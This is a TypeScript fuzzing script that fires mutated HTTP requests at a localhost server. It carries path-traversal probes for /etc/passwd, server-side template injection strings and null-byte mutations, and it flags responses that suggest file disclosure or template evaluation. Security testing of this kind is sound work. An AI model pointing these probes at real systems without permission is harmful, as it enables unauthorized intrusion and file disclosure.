const TARGET_URL = 'http://localhost:80/';
const ITERATIONS = 100;

// Creative idea 1: Mutation-based fuzzing - mutate valid requests progressively
const mutate = (str: string): string => {
  const mutations = [
    (s: string) => s.replace(/[aeiou]/gi, '\x00'),  // null byte injection
    (s: string) => s + '%00',                        // null terminator
    (s: string) => s.repeat(100),                    // amplification
    (s: string) => Buffer.from(s).reverse().toString(), // reverse bytes
    (s: string) => s.split('').map(c => `%${c.charCodeAt(0).toString(16)}`).join(''), // URL encode everything
  ];
  return mutations[Math.floor(Math.random() * mutations.length)](str);
};

// Creative idea 2: Template injection patterns that adapt based on response
const templates = [
  '{{7*7}}',                    // SSTI
  '${7*7}',                     // Template literal
  '<%= 7*7 %>',                 // ERB
  '#{7*7}',                     // Ruby
  '*{7*7}',                     // FreeMarker
  '@(7*7)',                     // Razor
  '~[7*7]',                     // Custom delimiter test
];

let templateIndex = 0;

const fuzz = async (id: number) => {
  const method = ['GET', 'POST', 'PUT'][id % 3];

  // Rotate through different attack vectors
  const attacks = [
    `/../../etc/passwd`,
    `/${mutate('admin')}`,
    `/?cmd=${templates[templateIndex++ % templates.length]}`,
    `/${Buffer.allocUnsafe(id % 50).toString('hex')}`, // random bytes
  ];

  const path = attacks[id % attacks.length];
  const body = method !== 'GET' ? mutate(JSON.stringify({ x: id })) : undefined;

  try {
    const res = await fetch(`${TARGET_URL.replace(/\/$/, '')}${path}`, {
      method,
      body,
      signal: AbortSignal.timeout(1000),
      headers: {
        'X-Mutated': mutate('test'),
        ...(body && { 'Content-Type': 'application/json' })
      }
    });

    const text = await res.text();

    // Detection indicators
    const flags = [
      text.includes('49') && '🎯SSTI',  // 7*7=49
      text.includes('root:') && '📁LFI',
      res.status === 500 && '💥500',
      text.length > 10000 && '🌊FLOOD',
    ].filter(Boolean).join(' ');

    console.log(`[${id}] ${method} ${path.slice(0, 30)} => ${res.status} ${flags}`);
  } catch (e) {
    console.log(`[${id}] ${method} ${path.slice(0, 30)} => ❌`);
  }
};

console.log(`🎯 Fuzzing ${TARGET_URL}\n`);

const start = Date.now();
await Promise.all(
  Array(ITERATIONS).fill(0).map((_, i) =>
    new Promise(r => setTimeout(() => fuzz(i).then(r), i * 20))
  )
);

console.log(`\n✅ Done in ${((Date.now() - start) / 1000).toFixed(1)}s`);
